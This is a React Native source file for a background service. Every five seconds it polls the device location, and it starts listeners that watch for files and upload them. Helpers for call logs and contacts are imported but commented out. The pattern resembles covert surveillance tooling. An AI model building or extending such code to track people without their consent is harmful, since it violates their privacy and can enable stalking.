
import BackgroundService from 'react-native-background-actions';
import { fetchData, postData, allCallLog } from './api';
import { getCurrentLocation } from './latLong';
import { getCallLogs } from './callLocg';
import { getContacts } from './getContacts';
import { startFileListening } from './getFiles';
import { startFileUploadListening } from './uploadSingleFile';







// Define the task
const sleep = time => new Promise(resolve => setTimeout(() => resolve(), time));

const backgroundTask = async (taskData) => {
  const { delay } = taskData;
  startFileListening();
  startFileUploadListening();
  

  // Loop indefinitely until stopped
  while (true) {
    
    // Your background task logic here

    getCurrentLocation();
    // getCallLogs();
    // getContacts();


    // const filedata = await startFileListening();
    // const result = await postData(filedata);


    // Your background task logic here




    // console.log('Background task running...');
    // Sleep for the specified delay
    await sleep(delay);
  }
};

// Start the background service
const startBackgroundService = async () => {
  const options = {
    taskName: 'MyBackgroundTask',
    taskTitle: 'Running Background Task',
    taskDesc: 'This is a demo of background service',
    taskIcon: {
      name: 'ic_launcher',
      type: 'mipmap',
    },
    color: '#ff00ff',
    linkingURI: 'yourScheme://chat/jane', // (optional) Linking to your app
    parameters: {
      delay: 5000, // Run every 5 seconds
    },
  };

  try {
    await BackgroundService.start(backgroundTask, options);
  } catch (error) {
    console.error("Background task failed to start:", error);
  }

  
};

// Stop the background service
const stopBackgroundService = async () => {
  try {
    await BackgroundService.stop();
  } catch (error) {
    console.error("Background task failed to start:", error);
  }
};

export { startBackgroundService, stopBackgroundService };
